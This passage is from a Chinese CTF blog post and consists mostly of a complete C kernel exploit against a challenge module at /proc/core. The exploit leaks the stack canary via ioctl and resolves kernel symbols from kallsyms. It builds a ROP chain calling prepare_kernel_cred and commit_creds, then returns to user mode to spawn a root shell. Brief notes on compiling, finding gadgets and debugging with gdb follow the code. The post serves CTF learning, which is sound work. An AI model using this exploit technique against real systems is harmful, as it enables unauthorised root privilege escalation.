class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trap_frame</span>&#123;</span>c</span><br><span class="line">    <span class="type">void</span> *rip;</span><br><span class="line">    <span class="type">uint64_t</span> cs;</span><br><span class="line">    <span class="type">uint64_t</span> rflags;</span><br><span class="line">    <span class="type">void</span> * rsp;</span><br><span class="line">    <span class="type">uint64_t</span> ss;</span><br><span class="line">&#125;__attribute__((packed));</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trap_frame</span> <span class="title">tf</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> kernel_base=<span class="number">0</span>;</span><br><span class="line"><span class="type">uint64_t</span> commit_creds=<span class="number">0</span>;</span><br><span class="line"><span class="type">uint64_t</span> prepare_kernel_cred = <span class="number">0</span>;</span><br><span class="line"><span class="type">uint64_t</span> commit_creds_offset = <span class="number">0x9c8e0</span>;</span><br><span class="line"><span class="type">uint64_t</span> prepare_kernel_cred_offset = <span class="number">0x9cce0</span>;</span><br><span class="line"><span class="type">uint64_t</span> canary = <span class="number">0</span>;</span><br><span class="line"><span class="type">uint64_t</span> rbp = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> prdi_ret = <span class="number">0x0b2f</span>; <span class="comment">//: pop rdi; ret;</span></span><br><span class="line"><span class="type">uint64_t</span> mov_rdi_rax_jmp_rcx = <span class="number">0x1ae978</span>; <span class="comment">//: mov rdi, rax; jmp rcx;</span></span><br><span class="line"><span class="type">uint64_t</span> mov_rdi_rax_jmp_rdx = <span class="number">0x6a6d2</span>; <span class="comment">//: mov rdi, rax; jmp rdx;</span></span><br><span class="line"><span class="type">uint64_t</span> prcx_ret = <span class="number">0x21e53</span>; <span class="comment">//: pop rcx; ret;</span></span><br><span class="line"><span class="type">uint64_t</span> swapgs_p_ret = <span class="number">0xa012da</span>; <span class="comment">//: swapgs; popfq; ret;</span></span><br><span class="line"><span class="type">uint64_t</span> iretq_ret = <span class="number">0x50ac2</span>; <span class="comment">//: iretq; ret;</span></span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">get_kernel_base</span><span class="params">()</span>&#123;</span><br><span class="line">    FILE *fd;</span><br><span class="line">    <span class="type">uint64_t</span> kernel_base1=<span class="number">0</span>,kernel_base2=<span class="number">0</span>;</span><br><span class="line">    fd=fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>,<span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="type">char</span> line[<span class="number">0x30</span>];</span><br><span class="line">    <span class="keyword">if</span>(fd&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        die(<span class="string">&quot;open kallsyms fialed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        fgets(line,<span class="number">0x30</span>,fd);</span><br><span class="line">        <span class="keyword">if</span>(kernel_base!=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(line,<span class="string">&quot;commit_creds&quot;</span>)&amp;&amp;!commit_creds)&#123;</span><br><span class="line">            getchar();</span><br><span class="line">            <span class="built_in">sscanf</span>(line,<span class="string">&quot;%llx&quot;</span>,&amp;commit_creds);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;commit_creds addr: %p\n&quot;</span>,commit_creds);</span><br><span class="line">            kernel_base1=commit_creds-commit_creds_offset;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(line,<span class="string">&quot;prepare_kernel_cred&quot;</span>)&amp;&amp;!prepare_kernel_cred)&#123;</span><br><span class="line">            getchar();</span><br><span class="line">            <span class="built_in">sscanf</span>(line,<span class="string">&quot;%llx&quot;</span>,&amp;prepare_kernel_cred);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;prepare_kernel_cred addr: %p\n&quot;</span>,prepare_kernel_cred);</span><br><span class="line">            kernel_base2=prepare_kernel_cred-prepare_kernel_cred_offset;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(kernel_base1!=<span class="number">0</span>&amp;&amp;kernel_base1==kernel_base2)&#123;</span><br><span class="line">            kernel_base=kernel_base1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">leak</span><span class="params">(<span class="type">int</span> fd)</span>&#123;</span><br><span class="line">    ioctl(fd,<span class="number">0x6677889C</span>,<span class="number">0x40</span>);</span><br><span class="line">    <span class="type">uint8_t</span> buffer[<span class="number">0x40</span>];</span><br><span class="line">    ioctl(fd,<span class="number">0x6677889B</span>,buffer);</span><br><span class="line">    canary=*(<span class="type">uint64_t</span> *)buffer;</span><br><span class="line">    rbp=*(<span class="type">uint64_t</span> *)(buffer+<span class="number">8</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;canary: %p\n&quot;</span>,canary);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">set_gadget_addr</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    prdi_ret += kernel_base;</span><br><span class="line">    prcx_ret += kernel_base;</span><br><span class="line">    mov_rdi_rax_jmp_rcx += kernel_base;</span><br><span class="line">    mov_rdi_rax_jmp_rdx += kernel_base;</span><br><span class="line">    swapgs_p_ret += kernel_base;</span><br><span class="line">    iretq_ret += kernel_base;</span><br><span class="line">    <span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">launch_shell</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span>&#123;</span><br><span class="line">     <span class="keyword">asm</span>(</span><br><span class="line">       <span class="string">&quot; mov %%cs, %0\n&quot;</span></span><br><span class="line">       <span class="string">&quot;mov %%ss,%1\n&quot;</span></span><br><span class="line">       <span class="string">&quot;mov %%rsp,%3\n&quot;</span></span><br><span class="line">       <span class="string">&quot;pushfq\n&quot;</span></span><br><span class="line">       <span class="string">&quot;popq %2&quot;</span></span><br><span class="line">       :<span class="string">&quot;=r&quot;</span>(tf.cs),<span class="string">&quot;=r&quot;</span>(tf.ss),<span class="string">&quot;=r&quot;</span>(tf.rflags),<span class="string">&quot;=r&quot;</span>(tf.rsp)</span><br><span class="line">       :</span><br><span class="line">       :<span class="string">&quot;memory&quot;</span></span><br><span class="line">    );</span><br><span class="line">    tf.rsp -= <span class="number">4096</span>;</span><br><span class="line">    tf.rip = &amp;launch_shell;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">launch_shell</span><span class="params">()</span>&#123;</span><br><span class="line">    execl(<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;sh&quot;</span>,<span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">bool</span> ret = get_kernel_base();</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="type">uint8_t</span> buffer[<span class="number">0x800</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;/proc/core&quot;</span>,O_RDWR);</span><br><span class="line">    leak(fd);</span><br><span class="line">    set_gadget_addr();</span><br><span class="line">    save_status();</span><br><span class="line">    <span class="type">uint64_t</span> *ptr;</span><br><span class="line">    ptr = (<span class="type">uint64_t</span> *)(buffer+<span class="number">0x40</span>);</span><br><span class="line">    *(ptr + i++) = canary;</span><br><span class="line">    *(ptr + i++) = rbp;</span><br><span class="line">    *(ptr + i++) = prdi_ret;</span><br><span class="line">    *(ptr + i++) = <span class="number">0</span>;</span><br><span class="line">    *(ptr + i++) = prepare_kernel_cred;</span><br><span class="line">    *(ptr + i++) = prcx_ret;</span><br><span class="line">    *(ptr + i++) = commit_creds;</span><br><span class="line">    *(ptr + i++) = mov_rdi_rax_jmp_rcx;</span><br><span class="line"></span><br><span class="line">    *(ptr + i++) = swapgs_p_ret;</span><br><span class="line">    *(ptr + i++) = <span class="number">0</span>;</span><br><span class="line">    *(ptr + i++) = iretq_ret;</span><br><span class="line">    *(ptr + i++) = (<span class="type">uint64_t</span>) launch_shell;</span><br><span class="line">    *(ptr + i++) = tf.cs;</span><br><span class="line">    *(ptr + i++) = tf.rflags;</span><br><span class="line">    *(ptr + i++) = tf.rsp;</span><br><span class="line">    *(ptr + i++) = tf.ss;</span><br><span class="line"></span><br><span class="line">    write(fd,buffer,<span class="number">0x800</span>);</span><br><span class="line">    <span class="type">uint64_t</span> len=<span class="number">0xffffffff00000000</span>;</span><br><span class="line">    <span class="type">uint32_t</span> l=<span class="number">0x100</span>;</span><br><span class="line">    len|=l;</span><br><span class="line">    ioctl(fd,<span class="number">0x6677889A</span>,len);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>一点补充：<br>静态编译exp(内核没有c库):<br><code>gcc exp.c -static -o exploit</code></p>
<p>查找gadget指令：<br><code>ROPgadget --binary vmlinux &gt; ropgadget</code></p>
<p>调试方法：<br>.sh脚本里有-s我们可以通过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gdb ./vmlinux</span><br><span class="line">target remote:1234</span><br><span class="line">add-symbol-file core.ko 0xffffffffc0000000  (该text的基地址通过cat /sys/module/core/sections/.text得到)</span><br></pre></td></tr></table></figure>
<p>这样就可以直接根据模块里的函数名下断了。</p>
<p>但又一点很疑惑的时pwngdb调内核空间巨卡，而且si&#x2F;ni直接跑飞了🤦，只能下断点再c这样调，ruan师傅说gef调起来很快，得再去搞个gef来。</p>
<p>参考博客（感谢）：<br><a target="_blank" rel="noopener" href="https://f5.pm/go-26809.html">https://f5.pm/go-26809.html</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/T1e9u/p/13805760.html">https://www.cnblogs.com/T1e9u/p/13805760.html</a><br><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/227357.html">https://www.freebuf.com/articles/system/227357.html</a></p>
</div><div class="article-tags is-size-7 mb-4"><span class="mr-2">#</span><a class="link-muted mr-2" rel="tag" href="/tags/CTF/">CTF</a><a class="link-muted mr-2" rel="tag" href="/tags/KERNEL/">KERNEL</a></div><!--!--></article></div><!--!--><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/2020/11/08/kernel_pwn(2)/"><i class="level-item fas fa-chevron-left"></i><span class="level-item">kernel_pwn Double_fetch</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/2020/11/04/Xnuca2020%E7%BA%BF%E4%B8%8A%E8%B5%9B/"><span class="level-item">Xnuca2020线上赛l</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><!--!--></div><!--!--><!--!--></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/">An9Ela</a><p class="is-size-7"><span>&copy; 2022 An9Ela</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p></div><div class="level-end"></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("default");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script src="/js/column.js"></script><!--!--><script src="/js/main.js" defer></script><!--!--></body></html>